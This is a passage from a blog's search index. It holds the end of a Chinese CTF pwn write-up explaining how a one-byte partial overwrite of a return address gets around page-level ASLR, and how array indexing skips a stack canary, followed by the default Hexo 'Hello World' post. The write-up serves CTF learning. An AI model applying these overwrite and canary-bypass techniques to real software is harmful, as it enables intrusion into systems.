就是返回地址的第一个字节</p><p>下面解释payload最后一字节:</p><p>首先，地址随机化只是进行页的随机化，一页的大小是 <code>0x1000</code>, 也就是说同一页上地址的后三位不会改变。</p><p>其次，小端储存，是指以字节为单位，低数位储存在低地址，高数位储存在高地址。返回地址是<code>call    _sub_400acd</code> 指令的下一条，地址即<code>0x00000000000008D8</code> , 所以我们最后是将上述地址覆盖成<code>0x0000000000000842</code> , 这正是 <code>sub_40067d()</code>的地址。这样我们就把程序劫持到该函数上打印flag</p><p>PS: 由于金丝雀是在栈上变量之后， <code>rbp</code>和返回地址之前，我们可以通过数组索引避开金丝雀实现栈溢出，所以本题开了<code>canary</code> 也可以做</p>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/13/hello-world/"/>
    <url>/2024/01/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="test">Test</h3><p><span class="math display">\[E=mc^2\]</span></p><p><span class="math display">\[c =\mu \cdot \lambda\]</span></p><p><span class="math display">\[\begin{align*}    u_n(x,t)&amp;=sin(\dfrac{n\pi}{x_0}x) \left[A_ncos(\dfrac{n\piv}{x_0}t)+B_nsin(\dfrac{n\pi v}{x_0}t)\right] \\    &amp;=N_nsin(\dfrac{n\pi}{x_0}x)sin(\dfrac{n\pi v}{x_0}t+\phi _n)\end{align*}\]</span></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
